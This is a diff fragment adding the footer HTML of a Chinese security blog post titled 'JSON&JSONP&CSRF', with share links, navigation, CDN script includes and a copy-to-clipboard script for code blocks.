+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://polosec.github.io/2020/05/22/JSON-JSONP-CSRF/&title=JSON&amp;JSONP&amp;CSRF"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://polosec.github.io/2020/05/22/JSON-JSONP-CSRF/&title=JSON&amp;JSONP&amp;CSRF"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://polosec.github.io/2020/05/22/JSON-JSONP-CSRF/&title=JSON&amp;JSONP&amp;CSRF"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://polosec.github.io/2020/05/22/JSON-JSONP-CSRF/&name=JSON&amp;JSONP&amp;CSRF&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://polosec.github.io/2020/05/22/JSON-JSONP-CSRF/&t=JSON&amp;JSONP&amp;CSRF"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2021
+    Polo
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
